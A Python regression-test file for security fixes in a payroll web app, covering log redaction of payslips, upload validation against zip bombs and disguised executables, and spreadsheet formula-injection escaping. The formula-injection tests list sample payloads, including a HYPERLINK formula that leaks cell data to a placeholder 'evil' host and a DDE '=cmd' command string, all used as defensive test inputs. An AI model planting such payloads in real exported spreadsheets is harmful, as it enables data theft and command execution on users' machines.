"""Regression tests for the F1-F9 security remediation pass.

One class per finding. Each pins the *property* the fix establishes rather than
its current implementation, so a refactor stays free but a regression does not:
these are the checks that would have failed before the fix and must keep failing
if it is ever undone.
"""
import io
import logging
import os
import tempfile
import unittest
import zipfile

os.environ["SKIP_DOTENV"] = "true"
os.environ["DATABASE_URL"] = "sqlite:///:memory:"
os.environ["PERSISTENCE_REQUIRED"] = "false"
# Deliberately NOT setting AUTO_INIT_DB here. A module-level assignment leaks to
# every other test module for the rest of the session, and turning it off stops
# create_app() initialising the schema — which the seeded suites
# (test_mvp, test_tenant_isolation, ...) depend on. The two tests that need it
# off set it themselves, inside the _EnvGuard save/restore.

from werkzeug.datastructures import FileStorage  # noqa: E402

from app import create_app  # noqa: E402
from app.csv_safety import escape_formula, escape_row  # noqa: E402
from app.distribution.channels import (  # noqa: E402
    ConsoleEmailSender,
    ConsoleSmsSender,
    ConsoleWhatsAppSender,
    OutboundMessage,
)
from app.spreadsheet_uploads import (  # noqa: E402
    ZIP_WORKBOOK_EXTENSIONS,
    SpreadsheetValidationError,
    assert_workbook_within_limits,
    validate_spreadsheet_upload,
)


def _app(**config):
    application = create_app()
    application.config.update(TESTING=True, WTF_CSRF_ENABLED=False, **config)
    return application


class _EnvGuard(unittest.TestCase):
    """Saves and restores the environment variables a test rewrites."""

    ENV_KEYS = (
        "RENDER", "RAILWAY_ENVIRONMENT", "FLASK_ENV", "APP_ENV", "SECRET_KEY",
        "DATABASE_URL", "PERSISTENCE_REQUIRED", "LOG_MESSAGE_BODIES", "AUTO_INIT_DB",
    )

    def setUp(self):
        self._saved = {k: os.environ.get(k) for k in self.ENV_KEYS}

    def tearDown(self):
        for key, value in self._saved.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value


class _CaptureLog(logging.Handler):
    def __init__(self):
        super().__init__()
        self.messages = []

    def emit(self, record):
        self.messages.append(record.getMessage())


class F1MessageBodiesNotLoggedTests(unittest.TestCase):
    """F1 — payslip bodies and raw recipients must never reach the log."""

    SECRET_BODY = "Net pay GHS 4,231.55 for Ama Mensah"
    PHONE = "+233241234567"
    EMAIL = "ama.mensah@example.com"

    def _send_all(self, application):
        """Send one message per console channel and return what was logged.

        Asserts the capture is non-empty before returning. That guard is the
        whole reason this helper exists: the interesting assertions here are
        *negative* ("the body is not in the log"), and a negative assertion over
        an empty string passes no matter what the code does — it would go on
        passing with the fix reverted. So an empty capture must be a failure,
        not a silent success.

        The way it used to go empty was ``migrations/env.py`` calling
        ``fileConfig()``, which disables every pre-existing logger by default —
        so any suite that had already run migrations left ``app``'s logger
        switched off for the rest of the process. That is fixed at the source
        now; the explicit re-enable below stays as cheap insurance, and the
        non-empty assertion stays because it is what would catch the next such
        cause rather than this one.
        """
        handler = _CaptureLog()
        logger = application.logger
        with application.app_context():
            was_disabled, previous_level = logger.disabled, logger.level
            logger.disabled = False
            logger.setLevel(logging.INFO)
            logger.addHandler(handler)
            try:
                ConsoleSmsSender().send(
                    OutboundMessage("sms", self.PHONE, "S", self.SECRET_BODY, item_id=42)
                )
                ConsoleWhatsAppSender().send(
                    OutboundMessage("whatsapp", self.PHONE, "S", self.SECRET_BODY,
                                    item_id=43)
                )
                ConsoleEmailSender().send(
                    OutboundMessage("email", self.EMAIL, "Payslip for Ama Mensah",
                                    self.SECRET_BODY, item_id=44)
                )
            finally:
                logger.removeHandler(handler)
                logger.disabled, logger.level = was_disabled, previous_level
        captured = "\n".join(handler.messages)
        self.assertTrue(
            captured.strip(),
            "captured nothing — the negative assertions below would pass vacuously",
        )
        return captured

    def test_body_recipient_and_subject_are_withheld_by_default(self):
        logged = self._send_all(_app())
        # Positive control first: prove the sends really were logged, so the
        # absences below mean "redacted", not "nothing happened".
        self.assertIn("console-sms", logged)
        self.assertIn("console-email", logged)
        self.assertNotIn(self.SECRET_BODY, logged)
        self.assertNotIn(self.PHONE, logged)
        self.assertNotIn(self.EMAIL, logged)
        self.assertNotIn("Ama Mensah", logged)

    def test_provider_and_item_id_are_still_logged(self):
        logged = self._send_all(_app())
        for expected in ("console-sms", "console-whatsapp", "console-email",
                         "item=42", "item=43", "item=44"):
            self.assertIn(expected, logged)

    def test_recipient_fingerprint_is_stable_and_not_the_address(self):
        from app.distribution.channels import recipient_fingerprint

        with _app().app_context():
            first = recipient_fingerprint(self.PHONE)
            self.assertEqual(first, recipient_fingerprint(f"  {self.PHONE}  "))
            self.assertNotIn(self.PHONE, first)
            self.assertNotEqual(first, recipient_fingerprint("+233209999999"))

    def test_opt_in_flag_restores_bodies_for_local_debugging(self):
        logged = self._send_all(_app(LOG_MESSAGE_BODIES=True))
        self.assertIn(self.SECRET_BODY, logged)


class F1ProductionRefusesBodyLoggingTests(_EnvGuard):
    """F1 — the flag must be impossible to enable on a real deployment."""

    ENV_KEYS = _EnvGuard.ENV_KEYS + ("DISTRIBUTION_WORKER_INLINE",)

    def _production_env(self):
        os.environ["SKIP_DOTENV"] = "true"
        os.environ["FLASK_ENV"] = "production"
        os.environ["DATABASE_URL"] = "postgresql://u:p@localhost/db"
        os.environ["AUTO_INIT_DB"] = "false"
        os.environ["SECRET_KEY"] = "x" * 64
        # Otherwise the app factory starts the inline distribution worker, which
        # immediately tries to reach the (nonexistent) Postgres above and fills
        # the run with connection-refused thread warnings.
        os.environ["DISTRIBUTION_WORKER_INLINE"] = "false"
        os.environ.pop("PERSISTENCE_REQUIRED", None)
        os.environ.pop("RENDER", None)

    def test_production_refuses_to_boot_with_body_logging_enabled(self):
        self._production_env()
        os.environ["LOG_MESSAGE_BODIES"] = "true"
        with self.assertRaises(RuntimeError) as ctx:
            create_app()
        self.assertIn("LOG_MESSAGE_BODIES", str(ctx.exception))

    def test_production_boots_with_the_flag_off_and_keeps_it_off(self):
        self._production_env()
        os.environ["LOG_MESSAGE_BODIES"] = "false"
        self.assertFalse(create_app().config["LOG_MESSAGE_BODIES"])


class F2SpreadsheetUploadValidationTests(unittest.TestCase):
    """F2 — type, size and zip-bomb gates on the workbook upload path."""

    @classmethod
    def setUpClass(cls):
        cls.app = _app()
        cls.real_xlsx = cls._build_workbook()

    @staticmethod
    def _build_workbook():
        from openpyxl import Workbook

        buffer = io.BytesIO()
        workbook = Workbook()
        workbook.active.append(["Staff ID", "Name"])
        workbook.active.append(["DCL9", "Ama"])
        workbook.save(buffer)
        return buffer.getvalue()

    @staticmethod
    def _upload(name, data, mimetype=None):
        return FileStorage(stream=io.BytesIO(data), filename=name, content_type=mimetype)

    def test_a_genuine_workbook_is_accepted(self):
        with self.app.app_context():
            name, extension, size = validate_spreadsheet_upload(
                self._upload("payroll.xlsx", self.real_xlsx)
            )
        self.assertEqual(extension, ".xlsx")
        self.assertEqual(size, len(self.real_xlsx))
        self.assertTrue(name.endswith(".xlsx"))

    def test_magic_bytes_beat_the_extension(self):
        """The decisive check: an executable renamed .xlsx must be refused."""
        with self.app.app_context():
            for data, label in (
                (b"MZ\x90\x00" + b"\x00" * 512, "PE executable"),
                (b"staff,name\n1,Ama\n", "CSV renamed .xlsx"),
                (b"<?xml version='1.0'?><x/>", "bare XML"),
            ):
                with self.subTest(label=label):
                    with self.assertRaises(SpreadsheetValidationError):
                        validate_spreadsheet_upload(self._upload("evil.xlsx", data))

    def test_a_workbook_renamed_csv_is_refused(self):
        with self.app.app_context():
            with self.assertRaises(SpreadsheetValidationError):
                validate_spreadsheet_upload(self._upload("evil.csv", self.real_xlsx))

    def test_empty_and_oversized_uploads_are_refused(self):
        with self.app.app_context():
            with self.assertRaises(SpreadsheetValidationError):
                validate_spreadsheet_upload(self._upload("e.xlsx", b""))
            oversized = b"PK\x03\x04" + b"\x00" * (9 * 1024 * 1024)
            with self.assertRaises(SpreadsheetValidationError):
                validate_spreadsheet_upload(self._upload("big.xlsx", oversized))

    def test_per_file_cap_stays_below_the_global_content_length(self):
        with self.app.app_context():
            from app.spreadsheet_uploads import max_bytes

            self.assertLess(max_bytes(), self.app.config["MAX_CONTENT_LENGTH"])

    def test_the_raw_importer_accepts_xlsx_only(self):
        with self.app.app_context():
            with self.assertRaises(SpreadsheetValidationError):
                validate_spreadsheet_upload(
                    self._upload("d.csv", b"a,b\n1,2\n"), allowed=ZIP_WORKBOOK_EXTENSIONS
                )

    def test_a_high_ratio_zip_bomb_is_refused_before_parsing(self):
        directory = tempfile.mkdtemp()
        path = os.path.join(directory, "bomb.xlsx")
        with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr("xl/worksheets/sheet1.xml", b"\0" * (64 * 1024 * 1024))
        self.assertLess(os.path.getsize(path), 1024 * 1024)  # tiny on the wire
        with self.app.app_context():
            with self.assertRaises(SpreadsheetValidationError):
                assert_workbook_within_limits(path)

    def test_an_entry_count_bomb_is_refused(self):
        directory = tempfile.mkdtemp()
        path = os.path.join(directory, "many.xlsx")
        with zipfile.ZipFile(path, "w") as archive:
            for index in range(1200):
                archive.writestr(f"part{index}.xml", b"x")
        with self.app.app_context():
            with self.assertRaises(SpreadsheetValidationError):
                assert_workbook_within_limits(path)

    def test_a_real_workbook_passes_the_bomb_gate(self):
        directory = tempfile.mkdtemp()
        path = os.path.join(directory, "good.xlsx")
        with open(path, "wb") as handle:
            handle.write(self.real_xlsx)
        with self.app.app_context():
            assert_workbook_within_limits(path)  # must not raise


class F3FormulaInjectionTests(unittest.TestCase):
    """F3 — one helper, applied wherever a value becomes a cell."""

    ATTACKS = (
        '=HYPERLINK("http://evil/?d="&A1,"payslip")',
        "+1+1",
        "-2+3",
        "@SUM(A1)",
        "\t=cmd|' /C calc'!A0",
        "\r=cmd",
    )

    def test_every_trigger_character_is_neutralised(self):
        for attack in self.ATTACKS:
            with self.subTest(attack=attack):
                escaped = escape_formula(attack)
                self.assertTrue(escaped.startswith("'"))
                self.assertEqual(escaped[1:], attack)

    def test_ordinary_text_is_untouched(self):
        for value in ("Ama Mensah", "DCL9", "", "Accra Main Branch"):
            self.assertEqual(escape_formula(value), value)

    def test_non_strings_keep_their_type_so_exports_still_sum(self):
        """The regression that would silently break every payroll total."""
        for value in (4231.55, -500.25, 0, 7, None, True):
            result = escape_formula(value)
            self.assertEqual(result, value)
            self.assertIs(type(result), type(value))

    def test_escape_row_applies_across_a_row(self):
        self.assertEqual(
            escape_row(["=cmd", "Ama", -500.25, 3]), ["'=cmd", "Ama", -500.25, 3]
        )

    def test_a_generated_workbook_contains_no_live_formula(self):
        import openpyxl

        from app.excel_utils import create_workbook, save_workbook, write_table

        evil = '=HYPERLINK("http://evil/?x="&A1,"click")'
        directory = tempfile.mkdtemp()
        with _app().app_context():
            workbook, sheet = create_workbook("Bank Listing", org_name=evil)
            write_table(sheet, 5, ["Staff ID", "Name", "Net Pay"],
                        [[evil, "Ama Mensah", 4231.55]])
            path = save_workbook(workbook, directory, "listing.xlsx")

        sheet = openpyxl.load_workbook(path).active
        for coordinate in ("A1", "A6", "B6"):
            self.assertNotEqual(sheet[coordinate].data_type, "f",
                                f"{coordinate} was stored as a live formula")
        self.assertEqual(sheet["C6"].value, 4231.55)  # amount still numeric


if __name__ == "__main__":
    unittest.main()
